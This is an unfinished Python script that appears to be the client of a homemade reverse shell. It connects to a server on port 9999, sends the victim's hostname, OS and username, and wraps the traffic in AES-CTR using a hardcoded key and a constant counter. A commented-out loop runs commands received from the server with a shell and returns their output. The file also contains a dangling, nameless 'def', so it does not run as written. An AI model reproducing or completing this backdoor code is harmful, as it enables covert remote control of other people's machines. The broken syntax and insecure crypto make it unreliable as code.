import socket
import os
import subprocess
import platform
import getpass
import time
from Crypto.Cipher import AES

COUNTER = "H"*16
KEY = "H"*32
DEBUG = True
CONN_SLEEP = 5 # How many seconds to pass before establishing connection to server. 

def get_os_info():
    os = platform.platform()
    host_name = socket.gethostname() 
    host_ip = socket.gethostbyname(host_name)
    processor = platform.processor()
    current_user = getpass.getuser()
    pe_arch = platform.architecture() # WindowsPE arch
    return '%s    %s %s        %s' % (host_name, os, current_user, pe_arch[0]) # Learn output formatting.

def 

# AES encryption for the socket.
def encrypt(message):
    encrypto = AES.new(KEY, AES.MODE_CTR, counter=lambda: COUNTER)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(KEY, AES.MODE_CTR, counter=lambda: COUNTER)
    return decrypto.decrypt(message)

s = socket.socket()
host = '127.0.0.1'
port = 9999

while True:
    try:
        s.connect((host, port))
        break
    except ConnectionRefusedError:
        if (DEBUG == True):
            print('Connection refused reconnecting to server after %s.' % (CONN_SLEEP))
        time.sleep(CONN_SLEEP)


# Get information about connecting client.
s.send(bytes(get_os_info(), 'utf-8'))

while True:
    data = s.recv(4096)

    # if data[:2].decode("utf-8") == 'cd':
    #     os.chdir(data[3:].decode("utf-8"))

    # if len(data) > 0:
    #     cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    #     output_byte = cmd.stdout.read() + cmd.stderr.read()
    #     output_str = str(output_byte,"utf-8")
    #     currentWD = os.getcwd() + "> "
    #     s.send(str.encode(output_str + currentWD))